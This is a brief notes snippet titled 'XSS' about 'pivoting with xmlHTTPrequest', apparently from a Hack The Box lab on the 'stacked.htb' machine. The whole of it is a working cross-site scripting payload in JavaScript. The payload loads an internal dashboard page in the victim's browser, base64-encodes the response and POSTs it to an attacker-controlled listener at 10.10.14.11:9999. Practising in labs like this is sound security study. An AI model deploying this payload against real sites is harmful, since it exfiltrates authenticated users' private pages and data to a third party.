### XSS
<b>Pivoting with xmlHTTPrequest</b>
```
function getpage() {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (xhr.readyState == XMLHttpRequest.DONE) {
            var resp = new XMLHttpRequest();
            resp.open("POST", "http://10.10.14.11:9999/");
            resp.send(btoa(xhr.responseText));
        }
    }
    xhr.open('GET', 'http://mail.stacked.htb/dashboard.php', true);
    xhr.send(null);
}
```

